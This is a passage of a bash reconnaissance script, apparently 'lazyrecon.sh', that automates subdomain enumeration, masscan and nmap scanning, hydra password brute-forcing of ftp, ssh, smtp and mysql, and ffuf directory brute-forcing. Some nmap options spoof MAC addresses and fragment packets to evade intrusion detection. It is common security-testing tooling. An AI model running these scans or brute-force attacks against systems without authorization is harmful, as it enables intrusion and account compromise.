  masscan -p0-65535 -iL $targetDir/dnsprobe_ip.txt --rate 500 -oG $targetDir/masscan_output.gnmap
  sleep 1
  sed -i '' '1d;2d;$d' $targetDir/masscan_output.gnmap # remove 1,2 and last lines from masscan out file
  # sort -k 7 -nb $targetDir/masscan_output.gnmap - o $targetDir/masscan_output.gnmap # sort by port number
}

# NSE-approach
# nmap --script "discovery,ftp*,ssh*,http-vuln*,mysql-vuln*,imap-*,pop3-*" -iL $targetDir/nmap_input.txt
nmap_nse(){
  # https://gist.github.com/storenth/b419dc17d2168257b37aa075b7dd3399
  # https://youtu.be/La3iWKRX-tE?t=1200
  # https://medium.com/@noobhax/my-recon-process-dns-enumeration-d0e288f81a8a
  echo "$[nmap] scanning..."
  while read line; do
    IP=$(echo $line | awk '{ print $4 }')
    PORT=$(echo $line | awk -F '[/ ]+' '{print $7}')
    FILENAME=$(echo $line | awk -v PORT=$PORT '{ print "nmap_"PORT"_"$4}' )

    echo "[nmap] scanning $IP using $PORT port"
    # -n: no DNS resolution
    # -Pn: Treat all hosts as online - skip host discovery
    # -sV: Probe open ports to determine service/version info (--version-intensity 9: means maximum probes)
    # -sS: raw packages
    # -sC: equivalent to --script=default (-O and -sC equal to run with -A)
    # -T4: aggressive time scanning
    # --spoof-mac Cisco: Spoofs the MAC address to match a Cisco product (0=random)
    # -f: used to fragment the packets (i.e. split them into smaller pieces) making it less likely that the packets will be detected by a firewall or IDS.

    # grep smtp /usr/local/Cellar/nmap/7.91/share/nmap/scripts/script.db
    # grep "intrusive" /usr/share/nmap/scripts/script.db
    nmap --spoof-mac 0 -n -sV --version-intensity 9 --script=default,http-headers -sS -Pn -T4 -p$PORT -oG $targetDir/nmap/$FILENAME $IP
    echo
    echo
  done < $targetDir/masscan_output.gnmap
  # cat $targetDir/nmap/* > $targetDir/nmap/nmap_out.txt
  # echo "$[nmap] grep for known RCE"
  # grep -i -e "dotnetnuke" -e "dnnsoftware" $targetDir/nmap/nmap_out.txt # https://www.exploit-db.com/exploits/48336
}

# hydra user/password attack on popular protocols
hydratest(){
  echo "[hydra] attacking network protocols"
  while read line; do
    IP=$(echo $line | awk '{ print $4 }')
    PORT=$(echo $line | awk -F '[/ ]+' '{print $7}')
    PROTOCOL=$(echo $line | awk -F '[/ ]+' '{print $10}')
    FILENAME=$(echo $line | awk -v PORT=$PORT '{ print "hydra_"PORT"_"$4}' )

    if [ "$PROTOCOL" = "ftp" -o "$PROTOCOL" = "ssh" -o "$PROTOCOL" = "smtp" -o "$PROTOCOL" = "mysql" ]; then
      echo "[hydra] scanning $IP on $PORT port using $PROTOCOL protocol"
      hydra -o $targetDir/hydra/$FILENAME -b text -L $usersList -P $passwordsList -s $PORT $IP $PROTOCOL
    fi
  done < $targetDir/masscan_output.gnmap
}

# directory bruteforce
ffufbrute(){
  if [ "$brute" = "1" ]; then
    echo "Start directory bruteforce using ffuf..."
    iterator=1
    while read subdomain; do
      # -c stands for colorized, -s for silent mode
      ffuf -c -s -u ${subdomain}/FUZZ -p 0.1-2.0 -recursion -recursion-depth 2 -mc all -fc 300,301,302,303,304,400,403,404,500,501,502,503 -fs 0 -w $customFfufBruteWordList -t $dirsearchThreads \
          -o $targetDir/ffuf/${iterator}.html  -of html
      iterator=$((iterator+1))
    done < $targetDir/3-all-subdomain-live-scheme.txt
  fi
}

recon(){
  enumeratesubdomains $1
  if [[ -n "$mad" ]]; then
    checkwaybackurls $1
  fi
  sortsubdomains $1
  permutatesubdomains $1

  dnsprobing $1
  checkhttprobe $1
  aquatoneshot $1
  nucleitest $1

  if [ "$mad" = "1" ]; then
    gospidertest $1
    # hakrawlercrawling $1
  fi

  custompathlist $1

  if [[ -n "$fuzz" ]]; then
    ssrftest $1
  fi

  # sqlmaptest $1
  # smugglertest $1 # disabled because still manually work need

  # masscantest $1
  # nmap_nse $1
  # hydratest $1

  # ffufbrute $1

  # echo "Generating HTML-report here..."
  echo "Lazy done."
}


main(){
  # collect wildcards to retest later
  if [[ -n $wildcard ]]; then
    if ! grep -Fxq $1 $storageDir/wildcard.txt; then
      echo $1 >> $storageDir/wildcard.txt
    fi
  fi

  # parse cidr input to create valid directory
  if [[ -n $cidr ]]; then
    CIDRFILEDIR=$(echo $1 | sed "s/\//_/")
    targetDir=$storageDir/$CIDRFILEDIR/$foldername
    if [ -d "$storageDir/$CIDRFILEDIR" ]; then
      echo "This is a known target."
    else
      mkdir $storageDir/$CIDRFILEDIR
    fi
  elif [[ -n $list ]]; then
    LISTFILEDIR=$(basename $1 | sed 's/[.]txt$//')
    targetDir=$storageDir/$LISTFILEDIR/$foldername
    if [ -d "$storageDir/$LISTFILEDIR" ]; then
      echo "This is a known target."
    else
      mkdir $storageDir/$LISTFILEDIR
    fi
  else
    targetDir=$storageDir/$1/$foldername
    if [ -d "$storageDir/$1" ]; then
      echo "This is a known target."
    else
      mkdir $storageDir/$1
    fi
  fi
  mkdir $targetDir

  # used for ffuf bruteforce
  if [ "$mad" = "1" -o "$brute" = "1" ]; then
    touch $targetDir/custom_ffuf_wordlist.txt
    customFfufBruteWordList=$targetDir/custom_ffuf_wordlist.txt
    # cp $dirsearchWordlist $customFfufBruteWordList

    # to with gf ssrf output
    touch $targetDir/custom_ffuf_ssrflist.txt
    customFfufSsrfWordList=$targetDir/custom_ffuf_ssrflist.txt

    touch $targetDir/custom_ffuf_pathlist.txt
    customFfufPathWordList=$targetDir/custom_ffuf_pathlist.txt
  fi
  # used to save target specific list for alterations (shuffledns, altdns)
  if [ "$alt" = "1" ]; then
    touch $targetDir/custom_subdomains_wordlist.txt
    customSubdomainsWordList=$targetDir/custom_subdomains_wordlist.txt
    cp $altdnsWordlist $customSubdomainsWordList
  fi

  if [ "$brute" = "1" ]; then
    # ffuf dir uses to store brute output
    mkdir $targetDir/ffuf/
  fi
  # aquatone output
  mkdir $targetDir/aquatone
  # nuclei output
  mkdir $targetDir/nuclei/
  # nmap output
  mkdir $targetDir/nmap/
  # hydra output
  mkdir $targetDir/hydra/
  if [ "$mad" = "1" ]; then
    # gospider output
    mkdir $targetDir/gospider/
    touch $targetDir/gospider/gospider-paths-list.txt
    # hakrawler output
    mkdir $targetDir/hakrawler/
    touch $targetDir/hakrawler/hakrawler-paths-list.txt
    # sqlmap output
    # mkdir $targetDir/sqlmap/
    # gau/waybackurls output
    mkdir $targetDir/wayback/
    touch $targetDir/wayback/wayback-paths-list.txt
  fi
  # brutespray output
  # mkdir $targetDir/brutespray/
  # subfinder list of subdomains
  touch $targetDir/subfinder-list.txt 
  # assetfinder list of subdomains
  touch $targetDir/assetfinder-list.txt
  # all assetfinder/subfinder finded domains
  touch $targetDir/enumerated-subdomains.txt
  # amass list of subdomains
  # touch $targetDir/amass-list.txt
  # shuffledns list of subdomains
  touch $targetDir/shuffledns-list.txt
  # gau/waybackurls list of subdomains
  touch $targetDir/wayback-subdomains-list.txt

  # mkdir $targetDir/reports/
  # echo "Reports goes to: ./${1}/${foldername}"

    recon $1
    # master_report $1
}

usage(){
  PROGNAME=$(basename $0)
  echo "Usage: ./lazyrecon.sh <target> [[-b] | [--brute]] [[-m] | [--mad]]"
  echo "Example: $PROGNAME example.com --mad"
}

invokation(){
  echo "Warn: unexpected positional argument: $1"
  echo "$(basename $0) [[-h] | [--help]]"
}

# check for help arguments or exit with no arguments
checkhelp(){
  while [ "$1" != "" ]; do
      case $1 in
          -h | --help )           usage
                                  exit
                                  ;;
          # * )                     invokation "$@"
          #                         exit 1
      esac
      shift
  done
}

# check for specifiec arguments (help)
checkargs(){
  while [ "$1" != "" ]; do
      case $1 in
          -s | --single )         single="1"
                                  ;;
          -l | --list )           list="1"
                                  ;;
          -i | --ip )             ip="1"
                                  ;;
          -c | --cidr )           cidr="1"
                                  ;;
          -b | --brute )          brute="1"
                                  ;;
          -f | --fuzz )           fuzz="1"
                                  ;;
          -m | --mad )            mad="1"
                                  ;;
          -a | --alt )            alt="1"
                                  ;;
          -w | --wildcard )       wildcard="1"
                                  ;;
          # * )                     invokation $1
          #                         exit 1
      esac
      shift
  done
}


##### Main

if [ $# -eq 0 ]; then
    echo "Error: expected positional arguments"
    usage
    exit 1
else
  if [ $# -eq 1 ]; then
    checkhelp "$@"
  fi
fi

if [ $# -gt 1 ]; then
  checkargs "$@"
fi

# positional parameters test
echo "Check params: $@"
echo "Check # of params: $#"
echo "Check params \$1: $1"
echo "Check params \$ip: $ip"
echo "Check params \$cidr: $cidr"
echo "Check params \$single: $single"
echo "Check params \$list: $list"
echo "Check params \$brute: $brute"
echo "Check params \$fuzz: $fuzz"
echo "Check params \$mad: $mad"
echo "Check params \$alt: $alt"
echo "Check params \$wildcard: $wildcard"

./logo.sh

# to avoid cleanup or `sort -u` operation
foldername=recon-$(date +"%y-%m-%d_%H-%M-%S")

# invoke
main $1
